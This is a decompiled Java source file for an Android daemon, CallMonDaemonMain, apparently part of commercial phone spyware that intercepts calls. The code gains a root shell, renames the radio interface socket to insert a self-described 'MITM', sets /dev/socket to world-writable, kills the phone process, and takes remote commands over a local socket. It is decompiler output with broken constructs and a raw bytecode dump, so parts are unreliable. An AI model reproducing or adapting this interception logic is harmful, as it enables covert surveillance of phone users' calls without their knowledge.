package com.vvt.callmanager;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.ConditionVariable;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import com.fx.daemon.exception.RunningException;
import com.fx.socket.FxSocketException;
import com.fx.socket.SocketCmd;
import com.fx.socket.command.RemoteCheckAlive;
import com.fx.socket.command.RemoteShutdownRequest;
import com.vvt.callmanager.a.k;
import com.vvt.callmanager.ref.command.RemoteKillPhone;
import com.vvt.callmanager.ref.command.RemoteKillPhoneNRenameRild;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import com.vvt.callmanager.ref.g;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.KMShell;
import com.vvt.shell.f;
import com.vvt.shell.j;
import java.util.HashSet;
import java.util.Iterator;
import java.util.concurrent.Callable;

public class CallMonDaemonMain
  implements com.fx.socket.a
{
  private final boolean a;
  private final boolean b;
  private final boolean c;
  private final boolean d;
  private ContentResolver e;
  private Context f;
  private Looper g;
  private com.fx.socket.b h;
  private PowerManager.WakeLock i;
  private Callable j;
  
  public CallMonDaemonMain()
  {
    boolean bool = g.a;
    this.a = bool;
    bool = g.b;
    this.b = bool;
    bool = g.c;
    this.c = bool;
    bool = g.e;
    this.d = bool;
    e locale = new com/vvt/callmanager/e;
    locale.<init>(this);
    this.j = locale;
  }
  
  private String a(String paramString, boolean paramBoolean)
  {
    boolean bool1 = this.d;
    if (bool1) {}
    f localf = f.b();
    Object[] arrayOfObject = new Object[1];
    arrayOfObject[0] = paramString;
    String str = String.format("chmod 755 %s", arrayOfObject);
    localf.a(str);
    localf.a("su radio");
    str = localf.a(paramString);
    boolean bool2 = this.a;
    if (bool2) {}
    localf.d();
    return str;
  }
  
  private void a()
  {
    boolean bool1 = this.b;
    if (bool1) {}
    bool1 = f();
    if (bool1)
    {
      bool1 = this.b;
      if (bool1) {}
      g();
    }
    boolean bool2;
    Object localObject3;
    try
    {
      bool1 = this.b;
      if (bool1) {}
      com.vvt.c.a.a();
      Object localObject1 = "callmond";
      bool2 = j.a((String)localObject1);
      if (bool2)
      {
        localObject1 = new com/fx/daemon/exception/RunningException;
        localObject3 = "Daemon is already running";
        ((RunningException)localObject1).<init>((String)localObject3);
        throw ((Throwable)localObject1);
      }
    }
    catch (RunningException localRunningException)
    {
      bool1 = this.d;
      if (bool1) {}
      d();
    }
    for (;;)
    {
      bool1 = this.b;
      if (bool1) {}
      return;
      com.fx.daemon.b.b(localRunningException);
      bool1 = this.b;
      if (bool1) {}
      Object localObject2 = "CallMonDaemonMain";
      com.fx.daemon.b.a((String)localObject2);
      bool1 = this.b;
      if (bool1) {}
      Looper.prepare();
      localObject2 = Looper.myLooper();
      this.g = ((Looper)localObject2);
      bool1 = this.b;
      if (bool1) {}
      localObject2 = com.fx.daemon.b.a();
      this.f = ((Context)localObject2);
      localObject2 = this.f;
      localObject2 = ((Context)localObject2).getContentResolver();
      this.e = ((ContentResolver)localObject2);
      bool1 = this.b;
      if (bool1) {}
      localObject2 = this.f;
      a((Context)localObject2);
      bool1 = this.b;
      if (bool1) {}
      h();
      bool1 = this.b;
      if (bool1) {}
      localObject2 = "callmgrd";
      bool1 = j.a((String)localObject2);
      if (bool1)
      {
        localObject2 = new com/fx/daemon/exception/RunningException;
        localObject3 = "Daemon is already running";
        ((RunningException)localObject2).<init>((String)localObject3);
        throw ((Throwable)localObject2);
      }
      bool1 = this.b;
      if (bool1) {}
      localObject2 = this.f;
      bool1 = k.a((Context)localObject2);
      if (!bool1)
      {
        bool1 = this.b;
        if (bool1) {}
        bool1 = c();
        bool2 = this.b;
        if ((!bool2) || (!bool1))
        {
          bool1 = this.b;
          if (bool1) {}
          b();
          bool1 = this.b;
          if (bool1) {}
          bool1 = c();
          bool2 = this.b;
          if ((!bool2) || (!bool1))
          {
            localObject2 = new com/fx/daemon/exception/RunningException;
            localObject3 = "Phone service is not active";
            ((RunningException)localObject2).<init>((String)localObject3);
            throw ((Throwable)localObject2);
          }
        }
      }
      bool1 = this.b;
      if (bool1) {}
      i();
      localObject2 = new android/os/ConditionVariable;
      bool2 = false;
      localObject3 = null;
      ((ConditionVariable)localObject2).<init>(false);
      localObject3 = new com/fx/daemon/a/a;
      Object localObject4 = this.e;
      Object localObject5 = com.vvt.callmanager.ref.c.b;
      ((com.fx.daemon.a.a)localObject3).<init>((ContentResolver)localObject4, (Uri)localObject5, (ConditionVariable)localObject2);
      boolean bool3 = this.b;
      if (bool3) {}
      ((com.fx.daemon.a.a)localObject3).start();
      bool2 = this.b;
      if (bool2) {}
      j();
      bool2 = this.b;
      if (bool2) {}
      long l = 120000L;
      bool1 = ((ConditionVariable)localObject2).block(l);
      if (!bool1)
      {
        localObject2 = new com/fx/daemon/exception/RunningException;
        localObject3 = "Daemon startup take too long";
        ((RunningException)localObject2).<init>((String)localObject3);
        throw ((Throwable)localObject2);
      }
      bool1 = this.c;
      if (bool1) {}
      localObject2 = this.e;
      localObject3 = com.vvt.callmanager.ref.d.b;
      bool3 = false;
      localObject4 = null;
      ((ContentResolver)localObject2).notifyChange((Uri)localObject3, null);
      localObject2 = new com/fx/daemon/a/c;
      localObject3 = "CallMonDaemonMain";
      localObject4 = com.vvt.a.a.c;
      localObject5 = this.j;
      ((com.fx.daemon.a.c)localObject2).<init>((String)localObject3, (String)localObject4, (Callable)localObject5);
      Thread.setDefaultUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject2);
      bool1 = this.b;
      if (bool1) {}
      Looper.loop();
    }
  }
  
  private void a(Context paramContext)
  {
    Object localObject = (PowerManager)paramContext.getSystemService("power");
    PowerManager.WakeLock localWakeLock = this.i;
    int k;
    if (localWakeLock != null)
    {
      localWakeLock = this.i;
      k = localWakeLock.isHeld();
      if (k != 0) {}
    }
    else
    {
      k = 1;
      String str = "CallMonDaemonMain";
      localObject = ((PowerManager)localObject).newWakeLock(k, str);
      this.i = ((PowerManager.WakeLock)localObject);
      localObject = this.i;
      ((PowerManager.WakeLock)localObject).acquire();
    }
    localObject = this.i;
    if (localObject != null)
    {
      localObject = this.i;
      boolean bool = ((PowerManager.WakeLock)localObject).isHeld();
      if (bool) {}
    }
    else
    {
      localObject = new com/fx/daemon/exception/RunningException;
      ((RunningException)localObject).<init>("Cannot acquire WakeLock");
      throw ((Throwable)localObject);
    }
  }
  
  private boolean a(f paramf)
  {
    boolean bool1 = true;
    String str1 = "";
    boolean bool2 = this.b;
    if (bool2) {}
    int k = 0;
    bool2 = false;
    str1 = null;
    for (;;)
    {
      int n = 100;
      if (k < n)
      {
        int i1 = 2;
        Object localObject = new Object[i1];
        localObject[0] = "/system/bin/ls";
        String str2 = com.vvt.callmanager.ref.b.e;
        localObject[bool1] = str2;
        str1 = String.format("%s %s", (Object[])localObject);
        str1 = paramf.a(str1);
        localObject = "No such file";
        bool2 = str1.contains((CharSequence)localObject);
        if (bool2) {
          break label115;
        }
        bool2 = bool1;
      }
      while (bool2)
      {
        k = this.b;
        if (k != 0) {}
        return bool2;
        label115:
        bool2 = false;
        str1 = null;
      }
      long l = 50;
      SystemClock.sleep(l);
      int m;
      k += 1;
    }
  }
  
  private String b(String paramString, boolean paramBoolean)
  {
    boolean bool1 = this.d;
    if (bool1) {}
    f localf = f.b();
    Object[] arrayOfObject = new Object[1];
    arrayOfObject[0] = paramString;
    String str = String.format("chmod 777 %s", arrayOfObject);
    localf.a(str);
    localf.a("su radio");
    str = localf.a(paramString);
    boolean bool2 = this.a;
    if (bool2) {}
    localf.d();
    return str;
  }
  
  private void b()
  {
    String str = "setprop ctl.restart ril-daemon";
    try
    {
      KMShell.a(str);
      str = "com.android.phone";
      j.b(str);
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private boolean c()
  {
    boolean bool1 = false;
    Context localContext = null;
    int k = 0;
    for (;;)
    {
      int m = 15;
      if (k < m)
      {
        long l = 500L;
        SystemClock.sleep(l);
        localContext = this.f;
        bool1 = k.a(localContext);
        boolean bool2 = this.b;
        if ((bool2) && (!bool1)) {}
      }
      else
      {
        return bool1;
      }
      k += 1;
    }
  }
  
  private void d()
  {
    Object localObject = this.e;
    if (localObject != null)
    {
      bool = this.b;
      if (bool) {}
      localObject = this.e;
      Uri localUri = com.vvt.callmanager.ref.d.b;
      ((ContentResolver)localObject).notifyChange(localUri, null);
    }
    localObject = this.g;
    if (localObject != null)
    {
      localObject = this.g;
      ((Looper)localObject).quit();
      bool = this.b;
      if (!bool) {}
    }
    boolean bool = this.b;
    if (bool) {}
    j.a();
  }
  
  private void e()
  {
    Object localObject = this.h;
    boolean bool;
    if (localObject != null)
    {
      bool = this.a;
      if (bool) {}
      localObject = this.h;
      ((com.fx.socket.b)localObject).a();
    }
    for (;;)
    {
      bool = this.b;
      if (bool) {}
      j.a();
      return;
      localObject = this.g;
      if (localObject != null)
      {
        bool = this.a;
        if (bool) {}
        localObject = this.g;
        ((Looper)localObject).quit();
      }
    }
  }
  
  private boolean f()
  {
    String str1 = "callmgrd";
    boolean bool1 = j.a(str1);
    boolean bool2 = this.a;
    if (bool2) {}
    String str2 = "callmond";
    bool2 = j.a(str2);
    boolean bool3 = this.a;
    if ((!bool3) || ((bool1) || (bool2))) {
      bool1 = true;
    }
    for (;;)
    {
      return bool1;
      bool1 = false;
      str1 = null;
    }
  }
  
  private void g()
  {
    boolean bool = this.b;
    if (bool) {}
    bool = this.b;
    if (bool) {}
    Object localObject = new com/vvt/callmanager/ref/a;
    ((com.vvt.callmanager.ref.a)localObject).<init>();
    ((com.vvt.callmanager.ref.a)localObject).d();
    bool = this.b;
    if (bool) {}
    localObject = "CallMonDaemonMain";
    com.fx.daemon.b.a((String)localObject);
    bool = this.b;
    if (bool) {}
  }
  
  private void h()
  {
    boolean bool = this.a;
    if (bool) {}
    try
    {
      com.fx.socket.b localb = new com/fx/socket/b;
      String str1 = "CallMonDaemonMain";
      String str2 = "com.fx.socket.callmond";
      localb.<init>(str1, str2, this);
      this.h = localb;
      localb = this.h;
      localb.start();
      return;
    }
    catch (FxSocketException localFxSocketException)
    {
      bool = this.d;
      if (bool) {}
      RunningException localRunningException = new com/fx/daemon/exception/RunningException;
      localRunningException.<init>("Socket server setup failed");
      throw localRunningException;
    }
  }
  
  private void i()
  {
    boolean bool1 = true;
    int k = 0;
    Object localObject1 = null;
    boolean bool2 = this.b;
    if (bool2) {}
    f localf;
    for (;;)
    {
      try
      {
        localf = f.b();
        str1 = "%s %s";
        int m = 2;
        localObject2 = new Object[m];
        int n = 0;
        Object localObject3 = null;
        String str2 = "/system/bin/ls";
        localObject2[0] = str2;
        n = 1;
        str2 = com.vvt.callmanager.ref.b.e;
        localObject2[n] = str2;
        str1 = String.format(str1, (Object[])localObject2);
        str1 = localf.a(str1);
        localObject2 = "%s %s";
        n = 2;
        localObject3 = new Object[n];
        int i1 = 0;
        str2 = null;
        String str3 = "/system/bin/ls";
        localObject3[0] = str3;
        i1 = 1;
        str3 = com.vvt.callmanager.ref.b.f;
        localObject3[i1] = str3;
        localObject2 = String.format((String)localObject2, (Object[])localObject3);
        localObject2 = localf.a((String)localObject2);
        localObject3 = "No such file";
        bool2 = str1.contains((CharSequence)localObject3);
        if (!bool2)
        {
          bool2 = bool1;
          localObject3 = "No such file";
          boolean bool3 = ((String)localObject2).contains((CharSequence)localObject3);
          if (bool3) {
            break label264;
          }
          if ((bool2) || (bool1)) {
            break;
          }
          bool1 = this.d;
          if (bool1) {}
          localf.d();
          RunningException localRunningException = new com/fx/daemon/exception/RunningException;
          localObject1 = "MITM setup failed";
          localRunningException.<init>((String)localObject1);
          throw localRunningException;
        }
      }
      finally
      {
        bool1 = this.d;
        if (bool1) {}
        localObject5 = new com/fx/daemon/exception/RunningException;
        ((RunningException)localObject5).<init>("MITM setup failed");
      }
      bool2 = false;
      str1 = null;
      continue;
      label264:
      bool1 = false;
      localObject5 = null;
    }
    if (bool2)
    {
      if (bool1)
      {
        localObject5 = "rm %s";
        k = 1;
        localObject1 = new Object[k];
        bool2 = false;
        str1 = null;
        localObject2 = com.vvt.callmanager.ref.b.f;
        localObject1[0] = localObject2;
        localObject5 = String.format((String)localObject5, (Object[])localObject1);
        localf.a((String)localObject5);
        bool1 = this.b;
        if (!bool1) {}
      }
      localObject5 = "mv %s %s";
      k = 2;
      localObject1 = new Object[k];
      bool2 = false;
      str1 = null;
      localObject2 = com.vvt.callmanager.ref.b.e;
      localObject1[0] = localObject2;
      bool2 = true;
      localObject2 = com.vvt.callmanager.ref.b.f;
      localObject1[bool2] = localObject2;
      localObject5 = String.format((String)localObject5, (Object[])localObject1);
      localf.a((String)localObject5);
      bool1 = this.b;
      if (!bool1) {}
    }
    Object localObject5 = "chmod 777 %s";
    k = 1;
    localObject1 = new Object[k];
    bool2 = false;
    String str1 = null;
    Object localObject2 = "/dev/socket";
    localObject1[0] = localObject2;
    localObject5 = String.format((String)localObject5, (Object[])localObject1);
    localf.a((String)localObject5);
    bool1 = this.b;
    if (bool1) {}
    localf.d();
    bool1 = this.b;
    if (bool1) {}
  }
  
  private void j()
  {
    Object localObject1;
    Object localObject4;
    boolean bool2;
    Object localObject3;
    try
    {
      localObject1 = f.b();
      Object localObject2 = "chmod 755 %s";
      boolean bool1 = true;
      localObject4 = new Object[bool1];
      String str = com.vvt.callmanager.ref.c.a;
      localObject4[0] = str;
      localObject2 = String.format((String)localObject2, (Object[])localObject4);
      ((f)localObject1).a((String)localObject2);
      localObject2 = "su radio";
      ((f)localObject1).a((String)localObject2);
      localObject2 = com.vvt.callmanager.ref.c.a;
      localObject2 = ((f)localObject1).a((String)localObject2);
      bool1 = this.a;
      if (bool1) {}
      ((f)localObject1).d();
      localObject1 = "not found";
      bool2 = ((String)localObject2).contains((CharSequence)localObject1);
      if (bool2)
      {
        localObject2 = new com/fx/daemon/exception/RunningException;
        localObject1 = "Startup script not found";
        ((RunningException)localObject2).<init>((String)localObject1);
        throw ((Throwable)localObject2);
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      localObject3 = new com/fx/daemon/exception/RunningException;
      ((RunningException)localObject3).<init>("Cannot get root shell");
      throw ((Throwable)localObject3);
    }
    if (localObject3 != null)
    {
      localObject1 = ((String)localObject3).toLowerCase();
      localObject4 = "permission denied";
      bool2 = ((String)localObject1).contains((CharSequence)localObject4);
      if (bool2)
      {
        localObject3 = com.vvt.callmanager.ref.c.a;
        bool2 = false;
        localObject1 = null;
        localObject3 = a((String)localObject3, false);
      }
    }
    if (localObject3 != null)
    {
      localObject3 = ((String)localObject3).toLowerCase();
      localObject1 = "operation not permitted";
      boolean bool3 = ((String)localObject3).contains((CharSequence)localObject1);
      if (bool3)
      {
        localObject3 = com.vvt.callmanager.ref.c.a;
        bool2 = false;
        localObject1 = null;
        b((String)localObject3, false);
      }
    }
  }
  
  /* Error */
  private boolean k()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: aload_0
    //   5: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   8: istore_3
    //   9: iload_3
    //   10: ifeq +3 -> 13
    //   13: iconst_0
    //   14: istore_3
    //   15: aconst_null
    //   16: astore 4
    //   18: invokestatic 56	com/vvt/shell/Mitm:b	()Lcom/vvt/shell/Mitm;
    //   21: astore 4
    //   23: aload_0
    //   24: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   27: istore 5
    //   29: iload 5
    //   31: ifeq +3 -> 34
    //   34: invokestatic 336	com/vvt/e/getInstance:c	()Z
    //   37: istore 5
    //   39: iload 5
    //   41: ifeq +24 -> 65
    //   44: invokestatic 340	com/vvt/e/b:getInstance	()Z
    //   47: istore 5
    //   49: iload 5
    //   51: ifeq +14 -> 65
    //   54: ldc_w 261
    //   57: astore 6
    //   59: aload 6
    //   61: invokestatic 264	com/vvt/shell/KMShell:getInstance	(Ljava/lang/String;)Ljava/lang/String;
    //   64: pop
    //   65: aload_0
    //   66: invokespecial 343	com/vvt/callmanager/CallMonDaemonMain:l	()V
    //   69: aload_0
    //   70: aload 4
    //   72: invokespecial 346	com/vvt/callmanager/CallMonDaemonMain:getInstance	(Lcom/vvt/shell/Mitm;)Z
    //   75: istore 5
    //   77: iload 5
    //   79: ifeq +57 -> 136
    //   82: aload_0
    //   83: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   86: istore 5
    //   88: iload 5
    //   90: ifeq +3 -> 93
    //   93: aload_0
    //   94: invokespecial 148	com/vvt/callmanager/CallMonDaemonMain:i	()V
    //   97: iconst_1
    //   98: istore_1
    //   99: aload 4
    //   101: ifnull +8 -> 109
    //   104: aload 4
    //   106: invokevirtual 72	com/vvt/shell/Mitm:d	()V
    //   109: aload_0
    //   110: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   113: istore_3
    //   114: iload_3
    //   115: ifeq +3 -> 118
    //   118: iload_1
    //   119: ireturn
    //   120: astore 6
    //   122: aload_0
    //   123: getfield 42	com/vvt/callmanager/CallMonDaemonMain:d	Z
    //   126: istore 5
    //   128: iload 5
    //   130: ifeq -31 -> 99
    //   133: goto -34 -> 99
    //   136: aload_0
    //   137: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   140: istore 5
    //   142: iload 5
    //   144: ifeq +3 -> 147
    //   147: ldc_w 261
    //   150: astore 6
    //   152: aload 4
    //   154: aload 6
    //   156: invokevirtual 68	com/vvt/shell/Mitm:getInstance	(Ljava/lang/String;)Ljava/lang/String;
    //   159: pop
    //   160: aload_0
    //   161: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   164: istore 5
    //   166: iload 5
    //   168: ifeq +3 -> 171
    //   171: ldc 102
    //   173: astore 6
    //   175: aload 6
    //   177: invokestatic 104	com/fx/daemon/b:getInstance	(Ljava/lang/String;)V
    //   180: aload_0
    //   181: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   184: istore 5
    //   186: iload 5
    //   188: ifeq +3 -> 191
    //   191: aload_0
    //   192: aload 4
    //   194: invokespecial 346	com/vvt/callmanager/CallMonDaemonMain:getInstance	(Lcom/vvt/shell/Mitm;)Z
    //   197: pop
    //   198: aload_0
    //   199: getfield 35	com/vvt/callmanager/CallMonDaemonMain:b	Z
    //   202: istore 5
    //   204: iload 5
    //   206: ifeq +3 -> 209
    //   209: aload_0
    //   210: invokespecial 148	com/vvt/callmanager/CallMonDaemonMain:i	()V
    //   213: goto -114 -> 99
    //   216: astore 6
    //   218: aload_0
    //   219: getfield 42	com/vvt/callmanager/CallMonDaemonMain:d	Z
    //   222: istore 5
    //   224: iload 5
    //   226: ifeq +3 -> 229
    //   229: aload 4
    //   231: ifnull -122 -> 109
    //   234: aload 4
    //   236: invokevirtual 72	com/vvt/shell/Mitm:d	()V
    //   239: goto -130 -> 109
    //   242: astore_2
    //   243: aload 4
    //   245: ifnull +8 -> 253
    //   248: aload 4
    //   250: invokevirtual 72	com/vvt/shell/Mitm:d	()V
    //   253: aload_2
    //   254: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	255	0	this	CallMonDaemonMain
    //   1	118	1	bool1	boolean
    //   3	1	2	localObject1	Object
    //   242	12	2	localObject2	Object
    //   8	107	3	bool2	boolean
    //   16	233	4	localf	Mitm
    //   27	198	5	bool3	boolean
    //   57	3	6	str1	String
    //   120	1	6	localRunningException	RunningException
    //   150	26	6	str2	String
    //   216	1	6	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   93	97	120	com/fx/daemon/exception/RunningException
    //   18	21	216	finally
    //   23	27	216	finally
    //   34	37	216	finally
    //   44	47	216	finally
    //   59	65	216	finally
    //   65	69	216	finally
    //   70	75	216	finally
    //   82	86	216	finally
    //   93	97	216	finally
    //   122	126	216	finally
    //   136	140	216	finally
    //   154	160	216	finally
    //   160	164	216	finally
    //   175	180	216	finally
    //   180	184	216	finally
    //   192	198	216	finally
    //   198	202	216	finally
    //   209	213	216	finally
    //   218	222	242	finally
  }
  
  private void l()
  {
    bool1 = this.b;
    if (bool1) {}
    String str1 = com.vvt.b.b.a(com.vvt.a.a.c, "busybox");
    String str2 = "%s killall -9 %s";
    int k = 2;
    Object[] arrayOfObject = new Object[k];
    arrayOfObject[0] = str1;
    bool1 = true;
    String str3 = "com.android.phone";
    arrayOfObject[bool1] = str3;
    str1 = String.format(str2, arrayOfObject);
    try
    {
      boolean bool2 = this.b;
      if (bool2) {}
      KMShell.a(str1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = this.d;
        if (!bool1) {}
      }
    }
    bool1 = this.b;
    if (bool1) {}
  }
  
  private void m()
  {
    boolean bool1 = false;
    float f1 = 0.0F;
    Object localObject1 = null;
    long l = 500L;
    boolean bool2 = false;
    Object localObject2 = null;
    float f2 = 0.0F;
    for (;;)
    {
      if (localObject2 != null)
      {
        bool3 = ((HashSet)localObject2).isEmpty();
        if (!bool3) {
          break;
        }
      }
      localObject2 = j.d("com.android.phone");
      bool3 = ((HashSet)localObject2).isEmpty();
      if (bool3) {
        SystemClock.sleep(l);
      }
    }
    boolean bool3 = this.b;
    if (bool3) {}
    String str1 = "com.android.phone";
    j.b(str1);
    SystemClock.sleep(l);
    Object localObject3 = null;
    for (;;)
    {
      if (localObject3 != null)
      {
        bool1 = ((HashSet)localObject3).isEmpty();
        if (!bool1) {}
      }
      else
      {
        localObject1 = j.d("com.android.phone");
        bool3 = ((HashSet)localObject1).isEmpty();
        if (!bool3) {
          break label331;
        }
        SystemClock.sleep(l);
        localObject3 = localObject1;
        continue;
      }
      bool1 = this.b;
      if (bool1) {}
      bool1 = true;
      f1 = Float.MIN_VALUE;
      Iterator localIterator1 = ((HashSet)localObject2).iterator();
      bool2 = bool1;
      f2 = f1;
      for (;;)
      {
        bool1 = localIterator1.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = (com.vvt.shell.d)localIterator1.next();
        if (localObject1 != null)
        {
          str1 = ((com.vvt.shell.d)localObject1).b;
          if (str1 != null)
          {
            Iterator localIterator2 = ((HashSet)localObject3).iterator();
            bool3 = bool2;
            float f3 = f2;
            for (;;)
            {
              bool2 = localIterator2.hasNext();
              if (!bool2) {
                break;
              }
              localObject2 = (com.vvt.shell.d)localIterator2.next();
              if (localObject2 != null)
              {
                String str2 = ((com.vvt.shell.d)localObject2).b;
                if (str2 != null)
                {
                  str2 = ((com.vvt.shell.d)localObject1).b;
                  localObject2 = ((com.vvt.shell.d)localObject2).b;
                  bool2 = str2.equals(localObject2);
                  if (bool2)
                  {
                    bool3 = false;
                    f3 = 0.0F;
                    str1 = null;
                  }
                }
              }
            }
            bool2 = bool3;
            f2 = f3;
          }
        }
      }
      bool1 = this.b;
      if ((!bool1) || (!bool2)) {
        m();
      }
      return;
      label331:
      localObject3 = localObject1;
    }
  }
  
  public static void main(String[] paramArrayOfString)
  {
    String str = com.vvt.a.a.c;
    com.fx.daemon.b.a("CallMonDaemonMain", str, "fx.log");
    CallMonDaemonMain localCallMonDaemonMain = new com/vvt/callmanager/CallMonDaemonMain;
    localCallMonDaemonMain.<init>();
    localCallMonDaemonMain.a();
  }
  
  private void n()
  {
    localObject = this.h;
    if (localObject != null)
    {
      bool = this.b;
      if (bool) {}
      localObject = this.h;
      ((com.fx.socket.b)localObject).a();
    }
    try
    {
      bool = this.b;
      if (bool) {}
      com.vvt.callmanager.ref.a.e();
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      try
      {
        do
        {
          for (;;)
          {
            ((com.vvt.callmanager.ref.a)localObject).c();
            long l = 10000L;
            SystemClock.sleep(l);
            bool = this.b;
            if (!bool) {}
          }
          localCannotGetRootShellException = localCannotGetRootShellException;
          bool = this.d;
        } while (!bool);
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool = this.d;
          if (!bool) {}
        }
      }
    }
    bool = this.b;
    if (bool) {}
    l = 5000L;
    SystemClock.sleep(l);
    bool = this.b;
    if (bool) {}
    localObject = new com/vvt/callmanager/ref/a;
    ((com.vvt.callmanager.ref.a)localObject).<init>();
  }
  
  public Object a(SocketCmd paramSocketCmd)
  {
    boolean bool1 = true;
    boolean bool2 = this.a;
    if (bool2) {}
    bool2 = false;
    Object localObject = null;
    boolean bool3 = paramSocketCmd instanceof RemoteCheckAlive;
    if (bool3)
    {
      bool2 = this.a;
      if (bool2) {}
      localObject = Boolean.valueOf(bool1);
    }
    for (;;)
    {
      bool3 = this.a;
      if (bool3) {}
      return localObject;
      bool3 = paramSocketCmd instanceof RemoteKillPhone;
      if (bool3)
      {
        bool2 = this.b;
        if (bool2) {}
        m();
        localObject = Boolean.valueOf(bool1);
      }
      else
      {
        bool3 = paramSocketCmd instanceof RemoteResetMitm;
        if (bool3)
        {
          bool2 = this.b;
          if (bool2) {}
          localObject = new com/vvt/callmanager/c;
          ((c)localObject).<init>(this);
          ((Thread)localObject).start();
          localObject = Boolean.valueOf(bool1);
        }
        else
        {
          bool3 = paramSocketCmd instanceof RemoteKillPhoneNRenameRild;
          if (bool3)
          {
            bool2 = this.b;
            if (bool2) {}
            bool2 = k();
            localObject = Boolean.valueOf(bool2);
          }
          else
          {
            bool3 = paramSocketCmd instanceof RemoteShutdownRequest;
            if (bool3)
            {
              bool2 = this.a;
              if (bool2) {}
              localObject = new java/lang/Thread;
              d locald = new com/vvt/callmanager/d;
              locald.<init>(this);
              ((Thread)localObject).<init>(locald);
              ((Thread)localObject).start();
              localObject = Boolean.valueOf(bool1);
            }
          }
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/CallMonDaemonMain.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */